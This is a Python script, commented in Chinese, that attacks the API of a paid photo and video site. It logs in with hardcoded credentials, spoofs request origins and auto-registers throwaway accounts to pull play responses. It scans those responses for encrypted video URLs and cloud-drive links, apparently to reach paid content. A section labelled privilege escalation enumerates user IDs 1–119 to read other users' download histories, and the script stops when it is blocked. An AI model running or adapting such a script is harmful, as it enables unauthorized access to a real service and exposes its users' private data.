# -*- coding: utf-8 -*-
"""密文猎手: sp_list + 搜索 + online_play 各身份, 找 sv_url/bdp/videos 密文"""

import urllib.request, urllib.parse, json, time, sys, ssl

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
out = []


def log(s):
    print(s, flush=True)
    out.append(str(s))


def req(method, path, data=None, headers=None, timeout=12):
    h = {
        "User-Agent": UA,
        "Origin": "https://loiship.com",
        "Referer": "https://loiship.com/",
    }
    if headers:
        h.update(headers)
    body = None
    if data is not None:
        body = json.dumps(data).encode()
        h["Content-Type"] = "application/json"
    r = urllib.request.Request(
        "https://api.moegoat.com" + path, data=body, headers=h, method=method
    )
    ctx = ssl.create_default_context()
    try:
        resp = urllib.request.urlopen(r, timeout=timeout, context=ctx)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")[:250]
    except Exception as e:
        return "EXC", type(e).__name__


shard = int(sys.argv[1]) if len(sys.argv) > 1 else 1
res = []

st, b = req(
    "POST", "/api/user/login", {"email": "3124323585@qq.com", "password": "9876543210."}
)
tok = ""
if st == 200:
    tok = (json.loads(b).get("access_token") or "").replace("bearer ", "")
H = {"Authorization": "Bearer " + tok}
log("login: %s" % st)
time.sleep(1)


def check_cipher(b, label):
    """检测 AES 密文特征(base64 长串)或 URL"""
    has_cipher = False
    for seg in b.split('"'):
        if (
            len(seg) > 50
            and seg.replace("=", "").isalnum()
            and "http" not in seg.lower()
        ):
            has_cipher = True
            log("  >>> 疑似密文 %s: %s..." % (label, seg[:80]))
    if "sv_list" in b or "bdp" in b or "sv_url" in b:
        log("  >>> 含 sv/bdp 字段 %s: %s" % (label, b[:300]))
    if "http" in b.lower() and (
        "pan.baidu" in b.lower() or "m3u8" in b.lower() or "mp4" in b.lower()
    ):
        log("  >>> 含视频/网盘链接 %s: %s" % (label, b[:300]))


# 1. sp_list
log("=== sp_list ===")
for path in [
    "/api/sp_list",
    "/api/sp_list?page=1",
    "/api/sp_list?page=1&sort=like_number",
    "/api/sp_list?page=1&type=1",
    "/api/sp_list/1",
]:
    st, b = req("GET", path, headers=H)
    res.append({"t": "sp-" + path[:30], "s": st, "b": b[:500]})
    log("sp %s: %s %s" % (path[:35], st, b[:200].replace("\n", " ")))
    check_cipher(b, path[:25])
    time.sleep(0.4)
    if st == 403:
        log("窗口关")
        raise SystemExit

# 2. 搜索
log("=== 搜索 ===")
for q in ["olive", "米胡桃", "cosplay", "JK", "写真"]:
    st, b = req("GET", "/api/lois?q=%s&page=1" % urllib.parse.quote(q), headers=H)
    res.append({"t": "search-" + q, "s": st, "b": b[:400]})
    log("search %s: %s %s" % (q, st, b[:150].replace("\n", " ")))
    check_cipher(b, "search-" + q)
    time.sleep(0.4)

# 3. online_play_v2 完整响应(新用户身份找 videos 密文)
log("=== online_play 响应完整性 ===")
suf = str(int(time.time()))[-6:]
st, b = req(
    "POST",
    "/api/user/signup",
    {"username": "c%s" % suf, "email": "%s@qq.com" % suf, "password": "Test1234!"},
)
nt = ""
if st == 200:
    try:
        j = json.loads(b)
        nt = (j.get("signup_token") or "").replace("bearer ", "")
    except Exception:
        pass
if nt:
    NH = {"Authorization": "Bearer " + nt}
    for lid in [6422, 6421, 6420]:
        st, b = req("GET", "/api/user/loi/online_play_v2/%d" % lid, headers=NH)
        res.append({"t": "op-%d" % lid, "s": st, "b": b[:500]})
        log("op %d: %s %s" % (lid, st, b[:200].replace("\n", " ")))
        check_cipher(b, "op-%d" % lid)
        time.sleep(0.4)

# 4. mydownloads 越权(评论会员用户附近 id)
log("=== mydownloads 越权 ===")
for uid in range(1, 120):
    st, b = req("GET", "/api/user/mydownloaded?user_id=%d&page=1" % uid, headers=H)
    res.append({"t": "mdl-%d" % uid, "s": st, "b": b[:400]})
    if st == 200:
        try:
            data = json.loads(b).get("data") or []
            if data:
                log(
                    ">>> mydownloaded user_id=%d 有 %d 条! %s"
                    % (uid, len(data), b[:400].replace("\n", " "))
                )
                check_cipher(b, "mdl-%d" % uid)
        except Exception:
            pass
    time.sleep(0.25)
    if st == 403:
        log("窗口关(mdl), 停")
        break

with open("sp_%d.jsonl" % shard, "w", encoding="utf-8") as f:
    for r in res:
        f.write(json.dumps(r, ensure_ascii=False) + "\n")
with open("sp_%d.txt" % shard, "w", encoding="utf-8") as f:
    f.write("\n".join(out))
log("sp shard%d done" % shard)
